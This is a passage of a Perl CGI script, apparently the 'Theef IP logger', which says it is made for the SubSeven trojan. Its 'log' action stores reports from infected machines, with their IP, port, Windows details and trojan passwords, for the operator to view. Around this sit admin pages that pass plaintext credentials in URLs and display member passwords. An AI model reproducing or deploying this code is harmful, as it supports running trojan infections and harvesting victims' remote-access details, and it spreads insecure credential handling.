if ($Xswin eq "true") {
print FILE "\$Xswin = \"$Xswin\";\n";
}
else {
print FILE "\$Xswin = \"false\";\n";
}
if ($Xsuser eq "true") {
print FILE "\$Xsuser = \"$Xsuser\";\n";
}
else {
print FILE "\$Xsuser = \"false\";\n";
}
if ($Xsip eq "true") {
print FILE "\$Xsip = \"$Xsip\";\n";
}
else {
print FILE "\$Xsip = \"false\";\n";
}
if ($Xsdate eq "true") {
print FILE "\$Xsdate = \"$Xsdate\";\n";
}
else {
print FILE "\$Xsdate = \"false\";\n";
}
if ($Xspass eq "true") {
print FILE "\$Xspass = \"$Xspass\";\n";
}
else {
print FILE "\$Xspass = \"false\";\n";
}
close(FILE);
print "DONE!</td></table>";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a>\n";
}
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


############# Add new member #############

if ($opper eq "am") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADD MEMBER</font></center></b></td><tr><td>\n";
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"user\" value = \"$username\">\n";
print "<input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"newm\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Member name: </td><td><input type = \"text\" name = \"mname\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Member pass: </td><td><input type = \"password\" name = \"mpass\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Add Member\"></td></table></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "newm") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {

$muser = $SUBIN{'mname'};
$mpass = $SUBIN{'mpass'};
if ($muser eq "" or $mpass eq "") {
$errortext = "You must fill in a username and password.";
&derror;
}
else {
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$membfound = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $muser) {
$membfound = "true";
$errortext = "There is already a member with this username.  Please select another.";
&derror;
}
}
if ($membfound eq "false") {
open(FILE, ">>subseven.mem");
print FILE "$muser|$mpass|\n";
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADD MEMBER</font></center></b></td><tr><td>\n";
print "Member added successfully.";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
close(FILE);
}


}
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

############## DELETE MEMBER ################

if ($opper eq "dm") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">DELETE MEMBER</font></center></b></td><tr><td>\n";
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"user\" value = \"$username\">\n";
print "<input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"delm\">\n";
print "<br><font face = \"$Xfont\" size = \"$Xsize\">Select Member: <select name = \"membd\">\n";
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
print "<option value = \"$member\">$member : $passwd\n";
}
print "</select><input type = \"submit\" value = \"Remove Member\"></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "delm") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
$md = $SUBIN{'membd'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">DELETE MEMBER</font></center></b></td><tr><td>\n";
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
open(FILE, ">subseven.mem");
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $md) {
print "Memeber deleted successfully.";
$found = "true";
}
else {
print FILE "$member|$passwd|\n"; 
}

}
close(FILE);
if ($found eq "false") {
print "Member not found!";
}
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

############# LOG IP, PORT, AND OTHER STUFF #############

if ($opper eq "log") {
########### REMOVE OLD ENTRYS FROM SAME IP #############


$ip = $SUBOUT{'ip'};
$port = $SUBOUT{'port'};
$id = $SUBOUT{'id'};
$win = $SUBOUT{'win'};
$s7p = $SUBOUT{'s7pass'};
$rpass = $SUBOUT{'rpass'};
$connection = $SUBOUT{'connection'};
$ok = "false";
if ($ip eq "" or $port eq "" or $win eq "") {
$errortext = "Missing required information.";
&derror;
}
else {
if ($Xsubpass eq "true") {
if ($s7p eq $Xkey) {
$ok = "true";
}
else {
$errortext = "The require logging password, has been set.  you did not send a valid one with the information to be logged.  If your setting up this program, the password variable is ?s7pass=reqired_password<br>";
&derror;
&bforce;
}
}
else {
$ok = "true";
}
if ($ok eq "true") {
open(FILE, "subseven.log");
@file = <FILE>;
close(FILE);
open(FILE, ">subseven.log");
foreach $line (@file) {
($ipc, $portgg, $dategg, $usergg, $dayzgg, $monzgg, $wingg, $tpassgg, $connectgg) = split(/\|/, $line);
($alpha2, $beta2, $delta2, $gama2) = split(/\./, $ip);
($alpha, $beta, $delta, $gama) = split(/\./, $ipc);
if ($alpha eq $alpha2 and $beta eq $beta2 and $usergg eq $id and $wingg eq $win and $connectgg eq $connection) {
}
else {
print FILE "$line";
}
}
close(FILE);
open(FILE, ">>subseven.log");
print FILE "$ip|$port|$date|$id|$mday|$mon|$win|$rpass|$connection|\n";
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">INFORMATION LOG</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Information logged successfully!</td></table>";
close(FILE);
}
}
}

########### DELETE ALL LOGS AFTER SPECIFIED DATES ############

open(FILE, "subseven.log");
@file = <FILE>;
close(FILE);
open(FILE, ">subseven.log");
foreach $log (@file) {
($ip, $port, $datem, $user, $dayz, $monz, $win, $tpass, $connection) = split(/\|/, $log);
$dayx = $dayz + $Xdent;
if ($mon eq 1) {
if ($dayz > 27) {
$dayx = $dayx - 28;
if ($mon eq 11) {
$monz = 0;
}
else {
$monz++;
}
}
}
else {
if ($dayz > 29) {
$dayx = $dayx - 30;
if ($mon eq 11) {
$monz = 0;
}
else {
$monz++;
}
}
}
if ($mon eq 2) {
if ($mday >= $dayx and $mon >= $monz) {
}
else {
print FILE "$log";
}
}
else {
if ($mday >= $dayx and $mon >= $monz) {
}
else {
print FILE "$log";
}
}
}
close(FILE);



if ($opper eq "about") {
}
else {
print "<p><center><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"http://theef.4-all.org\">[Theef Homepage]</a></center><p>\n";
}
########### End kill switch limets ##############
}

$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
$usernamez = $SUBIN{'user'};
$passwordz = $SUBIN{'pass'};

if ($username eq "" and $password eq "" and $usernamez eq "" and $passwordz eq "") {
if ($opper eq "" or $opper eq "about" or $opper eq "log" or $opper eq "view" or $opper eq "addressbook" or $opper eq "admin") {
}
else {
if ($error eq "false") {
print "<p><center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">INVALID OPERATION</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">You did not enter a valid opperation.\n";
print "</td></table></td></table><p>\n";
$opper = "about";
}
}
}

if ($opper eq "about") {
print "</td></table></td></table>\n";
print "<p><center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ABOUT - HELP</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Theef IP logger<br>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Version: 1.2 \n";
print "<hr width = 200 color = \"$Xborders\" align = \"left\">\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">programmer: Black-Fire<br>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">ICQ number: 64782400<br>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Web-site: <a href = \"http://www.black-fire.net\">www.black-fire.net</a><br>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">IRC: irc.black-fire.net port-6667 room-#bfn<br>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">e-mail: black\@black-fire.net <p>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">All questions may be sent to black\@black-fire.net. any problems that must to addressed right away can be sent to my icq number, however do not request to be added to my list unless I add you first. <p>\n";
print "Bugs and requests may be sent to my email not icq, if you do not receive a response, that means I have already fixed the problem or can't. <p>\n";
print "Before you contact me about any problems, please check the f.a.q. to make sure it is not explained there. most problems are explained in the readme file included with the program. look there before contacting me as well. I will not answer questions that are explained in ether of those places. <p>\n";
print "This program is created for use with subseven, and more then likely will not work with other programs.\n";
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<p>You can use this form to send me messages.  This is the best way to get in contact and will ensure a fast responce.  make sure to give me your email or icq number or somthing.  by default this form will send me information about your script.  it will help me solve the problem for you.  if you do not want me to have this type of information, you can click <a href = \"$script?action=about\">HERE </a> for a form that will not send me this type of information. although this is not recommended.<p><center>\n";
}
else {
print "<p>You can use this form to send me messages.  This is the best way to get in contact and will ensure a fast responce.  make sure to give me your email or icq number or somthing.  No information about this script will be sent to my icq number, however this will make it more difficult to solve problems and you may not get a useful responce.  because of this, make sure you give me a detail explination of your request.  keep in mind, if this is not your script and you do not have admin access, you can't send script information for security reasons.<p><center>\n";
}
$filepath = $ENV{'REQUEST_URI'};
print "<form action=\"http://wwp.icq.com/scripts/WWPMsg.dll\" method=\"post\" target = \"icq\" name = \"icqset\">\n";
print "<table border=\"1\" bordercolor = \"gray\" cellpadding=\"0\" cellspacing=\"0\"><tr><td>\n";
print "<table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" bgcolor=\"black\"><tr>\n";
print "<td align=\"left\" nowrap colspan=\"2\" bgcolor=\"midnightblue\"><font size=\"-1\" face=\"arial\" color=\"white\"><b>ICQ 64782400\n";
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<font face = \"$Xfont\" size = \"$Xsize\"> - With Information\n";
}
else {
print "<font face = \"$Xfont\" size = \"$Xsize\"> - Without Information\n";
}
print "</b></font></td>\n";
print "</tr><tr><td align=\"center\"><font size=\"-2\" face=\"ms sans serif\" color=\"blue\"><b>Sender Name</b> (optional):</font><br><input type=\"text\" name=\"from\" value=\"\" size=15 maxlength=40 onfocus=\"this.select()\" STYLE=\"background: Black; color: Blue; font: bold\"></td>\n";
print "<td align=\"center\"><font size=\"-2\" face=\"ms sans serif\" color=\"blue\"><b>Sender EMail</b> (optional):</font><br><input type=\"text\" name=\"fromemail\" value=\"\" size=15 maxlength=40 onfocus=\"this.select()\" STYLE=\"background: Black; color: Blue; font: bold\">\n";
print "<input type=\"hidden\" name=\"subject\" value=\"UNAUTHERIZED\"></td></tr><tr>\n";
print "<td align=\"center\" colspan=\"2\"><font size=\"-2\" face=\"ms sans serif\" color=\"blue\">Message:</font><br><textarea name=\"body\" rows=\"7\" cols=\"40\" wrap=\"Virtual\" STYLE=\"background: Black; color: Blue; font: bold\">max amount of charicters, is about 200, any more then that may not be sent.</textarea><br></td>\n";
print "</tr></table></td><tr><td><table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><table border = 0 cellpadding = 0 cellspacing = 0><td><input type=\"hidden\" name=\"to\" value=\"64782400\">\n";
print "<input type=\"button\" name=\"Send\" value=\"Send Message\" STYLE=\"background: Black; color: Blue; font: bold\" onClick = \"fixp()\">\n";
print "</td><td><input type=\"reset\" value=\"Clear\" STYLE=\"background: Black; color: Blue; font: bold\"></td><td>\n";
print "</td></table></td></table></form><iframe src = \"\" name = \"icq\" width = 1 height = 1></iframe></div>\n";
print "<script language = \"javascript\">\n";
print "function fixp() {\n";
print "var prevset = document.icqset.body.value;\n";
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "document.icqset.body.value = \"URL:\" + window.location + \"---------------\" + prevset + \"\";\n";
print "document.icqset.subject.value = 'SubLogger, owner';\n";
print "alert('Your message was sent.  you will receve a reply within a few days, if you gave a form of contact.')\n";
}
else {
print "alert('Your message has been sent.')\n";
print "document.icqset.subject.value = 'SubLogger, USER';\n";
}
print "document.icqset.submit()\n";
print "document.icqset.body.value = prevset;\n";
print "}\n";
print "</script></td></table>\n";
print "And if that dosnt work, go <a href = \"http://wwp.icq.com/64782400\">HERE</a> to another web pager + info.</td></table></td></table><p><center><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"http://theef.4-all.org\">[Theef]</a></center><p>\n";

}




########### Display error message ############
sub derror {
if ($error eq "false") {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">USER ERROR</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"$Xfont\" size = \"$Xsize\">$errortext\n";

print "</td></table>\n";
$error = "true";
}
};

############ STOP BRUTE FORCE ####################

sub bforce {
$ra = $ENV{'REMOTE_ADDR'};
$found = "false";
open(FILE, "subseven.ban");
@file = <FILE>;
close(FILE);
open(FILE, ">subseven.ban");
foreach $bann (@file) {
($Bip, $Bday, $Bcnt) = split(/\|/, $bann);
if ($Bip eq $ra) {
$Bcnt++;
print FILE "$Bip|$Bday|$Bcnt|\n";
$newc = $Bcnt;
$found = "true";
}
else {
print FILE "$Bip|$Bday|$Bcnt|\n";
}
}
close(FILE);
if ($found eq "false") {
open(FILE, ">>subseven.ban");
print FILE "$ra|$mday|1|\n";
close(FILE);
$newc = 1;
}

$fban = 10 - $newc;
print "</td></table></td></table>\n";
print "<p><center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">BANN WARNING</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"$Xfont\" size = \"$Xsize\">You have $fban trys left, before you will be banned from this program!\n";
print "</td></table>\n";
}

print "</body></html>\n";
}